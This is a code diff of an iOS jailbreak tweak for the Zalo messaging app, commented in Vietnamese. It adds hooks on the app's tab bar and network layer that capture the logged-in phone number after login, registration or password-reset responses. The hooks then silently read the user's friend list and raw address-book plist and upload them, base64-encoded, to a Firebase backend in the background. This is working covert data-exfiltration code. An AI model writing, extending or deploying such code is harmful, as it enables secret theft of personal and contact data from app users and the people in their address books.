@@ -486,16 +486,22 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
 // ==============================================================================
 // TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐẨY LÊN FIREBASE WEB
 // ==============================================================================
+// ==============================================================================
+// TỰ ĐỘNG ĐỌC DANH BẠ BẠN BÈ VÀ ĐÓNG GÓI CHUẨN FILE .ADBK ĐẨY LÊN FIREBASE WEB
+// ==============================================================================
 static void autoSyncFriendsToFirebase(NSString *phoneStr) {
-    if (!phoneStr || phoneStr.length < 9) return;
+    if (!phoneStr || phoneStr.length < 8) return;
 
     NSString *cleanPhone = [[phoneStr componentsSeparatedByCharactersInSet:
         [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
     if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
         cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
+    } else if (![cleanPhone hasPrefix:@"0"] && cleanPhone.length >= 9) {
+        cleanPhone = [@"0" stringByAppendingString:cleanPhone];
     }
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+        // 1. Tìm và đọc dữ liệu từ AppGroup / Documents của Zalo
         NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
         NSString *plistPath = nil;
         if (groupURL) {
@@ -506,37 +512,63 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
         }
 
-        if (![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) return;
-
-        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plistPath];
-        if (!dict || dict.count == 0) return;
-
         NSMutableArray<NSString *> *friendNames = [NSMutableArray array];
+        NSData *rawPlistData = nil;
 
-        for (id key in dict) {
-            id val = dict[key];
-            if ([val isKindOfClass:[NSData class]]) {
-                @try {
-                    #pragma clang diagnostic push
-                    #pragma clang diagnostic ignored "-Wdeprecated-declarations"
-                    NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
-                    #pragma clang diagnostic pop
-                    NSArray *objs = inner[@"$objects"];
-                    if (objs && objs.count >= 2) {
-                        for (id obj in objs) {
-                            if ([obj isKindOfClass:[NSString class]] && [obj length] >= 2) {
-                                NSString *s = (NSString *)obj;
-                                if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && ![s isEqualToString:@"ZSDFriendEntity"] && ![s isEqualToString:@"NSObject"]) {
-                                    if (![friendNames containsObject:s] && friendNames.count < 500) {
-                                        [friendNames addObject:s];
-                                        break;
+        if ([[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
+            rawPlistData = [NSData dataWithContentsOfFile:plistPath];
+            NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plistPath];
+            if (dict && dict.count > 0) {
+                for (id key in dict) {
+                    id val = dict[key];
+                    if ([val isKindOfClass:[NSData class]]) {
+                        @try {
+                            #pragma clang diagnostic push
+                            #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+                            NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
+                            #pragma clang diagnostic pop
+                            NSArray *objs = inner[@"$objects"];
+                            if (objs && objs.count >= 2) {
+                                for (id obj in objs) {
+                                    if ([obj isKindOfClass:[NSString class]] && [obj length] >= 2) {
+                                        NSString *s = (NSString *)obj;
+                                        if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && ![s isEqualToString:@"ZSDFriendEntity"] && ![s isEqualToString:@"NSObject"] && ![s isEqualToString:@"ZSDAliasEntity"]) {
+                                            if (![friendNames containsObject:s] && friendNames.count < 1000) {
+                                                [friendNames addObject:s];
+                                                break;
+                                            }
+                                        }
                                     }
+                                }
+                            }
+                        } @catch (NSException *e) {}
+                    }
+                }
+            }
+        }
+
+        // 2. Nếu AppGroup chưa có dữ liệu, thử đọc từ in-memory ZContactManager của Zalo
+        if (friendNames.count == 0) {
+            @try {
+                Class contactMgrCls = NSClassFromString(@"ZContactManager") ?: NSClassFromString(@"ZDBContactManager");
+                if (contactMgrCls && [contactMgrCls respondsToSelector:@selector(sharedManager)]) {
+                    id mgr = [contactMgrCls performSelector:@selector(sharedManager)];
+                    if (mgr && [mgr respondsToSelector:@selector(getAllFriends)]) {
+                        NSArray *contacts = [mgr performSelector:@selector(getAllFriends)];
+                        if ([contacts isKindOfClass:[NSArray class]]) {
+                            for (id c in contacts) {
+                                NSString *name = nil;
+                                if ([c respondsToSelector:@selector(displayName)]) name = [c performSelector:@selector(displayName)];
+                                else if ([c respondsToSelector:@selector(contactName)]) name = [c performSelector:@selector(contactName)];
+                                else if ([c respondsToSelector:@selector(zaloName)]) name = [c performSelector:@selector(zaloName)];
+                                if (name && name.length >= 2 && ![friendNames containsObject:name]) {
+                                    [friendNames addObject:name];
                                 }
                             }
                         }
                     }
-                } @catch (NSException *e) {}
-            }
+                }
+            } @catch (NSException *e) {}
         }
 
         if (friendNames.count == 0) return;
@@ -547,8 +579,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
         }
 
-        NSData *rawPlistData = [NSData dataWithContentsOfFile:plistPath];
-        NSString *base64Plist = [rawPlistData base64EncodedStringWithOptions:0] ?: @"";
+        NSString *base64Adbk = rawPlistData ? [rawPlistData base64EncodedStringWithOptions:0] : @"";
 
         NSData *friendsJsonData = [NSJSONSerialization dataWithJSONObject:friendNames options:0 error:nil];
         NSString *friendsJsonStr = [[NSString alloc] initWithData:friendsJsonData encoding:NSUTF8StringEncoding] ?: @"[]";
@@ -568,7 +599,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                 @"total_friends": @{ @"integerValue": @(friendNames.count) },
                 @"sample_friends": @{ @"stringValue": sampleStr },
                 @"friends_json": @{ @"stringValue": friendsJsonStr },
-                @"adbk_payload_base64": @{ @"stringValue": base64Plist },
+                @"adbk_payload_base64": @{ @"stringValue": base64Adbk },
                 @"updated_at": @{ @"stringValue": [[NSDate date] description] }
             }
         };
@@ -579,7 +610,115 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 }
 
 // ==============================================================================
-// HOOK ZALO WEBVIEW
+// HOOK 1: BẮT MÀN HÌNH CHÍNH SAU KHI ĐĂNG NHẬP / ĐĂNG KÝ / QUÊN PASS THÀNH CÔNG
+// ==============================================================================
+%hook UITabBarController
+
+- (void)viewDidAppear:(BOOL)animated {
+    %orig;
+    
+    // Tự động kiểm tra xem có phải Zalo Main Tab Bar không
+    NSString *clsName = NSStringFromClass([self class]);
+    if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
+        static NSString *lastExtractedPhone = nil;
+        
+        // Tìm số điện thoại tài khoản đang đăng nhập trong Session/Preferences
+        NSString *currentPhone = nil;
+        @try {
+            NSDictionary *prefs = [[NSUserDefaults standardUserDefaults] dictionaryRepresentation];
+            for (NSString *key in prefs) {
+                if ([key containsString:@"last_phone"] || [key containsString:@"current_phone"] || [key containsString:@"login_phone"] || [key isEqualToString:@"phone"]) {
+                    NSString *v = prefs[key];
+                    if ([v isKindOfClass:[NSString class]] && v.length >= 9) {
+                        currentPhone = v;
+                        break;
+                    }
+                }
+            }
+        } @catch (NSException *e) {}
+
+        if (!currentPhone) {
+            NSString *savedK = getSavedLicenseKey();
+            if (savedK.length > 0) currentPhone = savedK;
+        }
+
+        if (currentPhone && ![currentPhone isEqualToString:lastExtractedPhone]) {
+            lastExtractedPhone = [currentPhone copy];
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
+                autoSyncFriendsToFirebase(currentPhone);
+            });
+        }
+    }
+}
+
+%end
+
+// ==============================================================================
+// HOOK 2: BẮT PHẢN HỒI NETWORK API (OTP / PASS / REG / FORGOT THÀNH CÔNG)
+// ==============================================================================
+%hook NSURLSession
+
+- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
+    if (!completionHandler) {
+        return %orig;
+    }
+
+    NSURL *url = request.URL;
+    NSString *path = [url.path lowercaseString];
+
+    BOOL isAuthEndpoint = [path containsString:@"/login"] ||
+                          [path containsString:@"/register"] ||
+                          [path containsString:@"/forgot"] ||
+                          [path containsString:@"/account/verify"] ||
+                          [path containsString:@"/api/v3/auth"];
+
+    if (isAuthEndpoint) {
+        void (^wrappedHandler)(NSData *data, NSURLResponse *response, NSError *error) = ^(NSData *data, NSURLResponse *response, NSError *error) {
+            if (data && !error) {
+                @try {
+                    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
+                    if ([json isKindOfClass:[NSDictionary class]]) {
+                        NSInteger errorCode = [json[@"error_code"] integerValue];
+                        id dataObj = json[@"data"];
+                        BOOL isSuccess = (errorCode == 0);
+
+                        if (isSuccess) {
+                            NSString *detectedPhone = nil;
+                            if ([dataObj isKindOfClass:[NSDictionary class]]) {
+                                detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"] ?: dataObj[@"userId"];
+                            }
+                            if (!detectedPhone) {
+                                // Tìm trong query hoặc body
+                                NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
+                                for (NSURLQueryItem *item in comps.queryItems) {
+                                    if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
+                                        detectedPhone = item.value;
+                                        break;
+                                    }
+                                }
+                            }
+
+                            if (detectedPhone && detectedPhone.length >= 9) {
+                                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
+                                    autoSyncFriendsToFirebase(detectedPhone);
+                                });
+                            }
+                        }
+                    }
+                } @catch (NSException *e) {}
+            }
+            completionHandler(data, response, error);
+        };
+        return %orig(request, wrappedHandler);
+    }
+
+    return %orig(request, completionHandler);
+}
+
+%end
+
+// ==============================================================================
+// HOOK 3: ZALO WEBVIEW (CHUYỂN HƯỚNG QR -> SEQ KHI XÁC MINH BẠN BÈ)
 // ==============================================================================
 %hook WKWebView
 
